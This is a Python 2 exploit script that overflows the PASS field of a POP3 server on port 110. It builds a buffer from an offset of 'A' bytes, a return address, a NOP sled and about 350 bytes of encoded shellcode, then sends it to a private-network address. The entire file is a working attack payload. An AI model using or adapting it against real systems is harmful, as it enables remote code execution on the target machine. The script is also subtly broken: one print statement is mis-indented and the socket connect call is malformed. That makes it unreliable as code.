#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

shellcode = (
"\xbe\x98\x9d\x51\xf1\xd9\xe5\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x31\x77\x12\x03\x77\x12\x83\x77\x61\xb3\x04\x7b\x72\xb6"
"\xe7\x83\x83\xd7\x6e\x66\xb2\xd7\x15\xe3\xe5\xe7\x5e\xa1\x09"
"\x83\x33\x51\x99\xe1\x9b\x56\x2a\x4f\xfa\x59\xab\xfc\x3e\xf8"
"\x2f\xff\x12\xda\x0e\x30\x67\x1b\x56\x2d\x8a\x49\x0f\x39\x39"
"\x7d\x24\x77\x82\xf6\x76\x99\x82\xeb\xcf\x98\xa3\xba\x44\xc3"
"\x63\x3d\x88\x7f\x2a\x25\xcd\xba\xe4\xde\x25\x30\xf7\x36\x74"
"\xb9\x54\x77\xb8\x48\xa4\xb0\x7f\xb3\xd3\xc8\x83\x4e\xe4\x0f"
"\xf9\x94\x61\x8b\x59\x5e\xd1\x77\x5b\xb3\x84\xfc\x57\x78\xc2"
"\x5a\x74\x7f\x07\xd1\x80\xf4\xa6\x35\x01\x4e\x8d\x91\x49\x14"
"\xac\x80\x37\xfb\xd1\xd2\x97\xa4\x77\x99\x3a\xb0\x05\xc0\x52"
"\x75\x24\xfa\xa2\x11\x3f\x89\x90\xbe\xeb\x05\x99\x37\x32\xd2"
"\xde\x6d\x82\x4c\x21\x8e\xf3\x45\xe6\xda\xa3\xfd\xcf\x62\x28"
"\xfd\xf0\xb6\xff\xad\x5e\x69\x40\x1d\x1f\xd9\x28\x77\x90\x06"
"\x48\x78\x7a\x2f\xe3\x83\xed\x90\x5c\x95\xe8\x78\x9f\xa9\xf3"
"\xc3\x16\x4f\x99\x23\x7f\xd8\x36\xdd\xda\x92\xa7\x22\xf1\xdf"
"\xe8\xa9\xf6\x20\xa6\x59\x72\x32\x5f\xaa\xc9\x68\xf6\xb5\xe7"
"\x04\x94\x24\x6c\xd4\xd3\x54\x3b\x83\xb4\xab\x32\x41\x29\x95"
"\xec\x77\xb0\x43\xd6\x33\x6f\xb0\xd9\xba\xe2\x8c\xfd\xac\x3a"
"\x0c\xba\x98\x92\x5b\x14\x76\x55\x32\xd6\x20\x0f\xe9\xb0\xa4"
"\xd6\xc1\x02\xb2\xd6\x0f\xf5\x5a\x66\xe6\x40\x65\x47\x6e\x45"
"\x1e\xb5\x0e\xaa\xf5\x7d\x3e\xe1\x57\xd7\xd7\xac\x02\x65\xba"
"\x4e\xf9\xaa\xc3\xcc\x0b\x53\x30\xcc\x7e\x56\x7c\x4a\x93\x2a"
"\xed\x3f\x93\x99\x0e\x6a")
buffer= "A" *2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16  + shellcode + "C" * (3500-2606-4-351-16)
try:
print "\nSending evil buffer v1"
	connect=s.connect(('192.168.15.34'),110)
	s.recv(1024)
	s.send('USER username \r\n')
	s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	s.send('QUIT\r\n')
	s.close()
	print "\nDone!."
except:
	print "Could not find POP3 server\r\n"
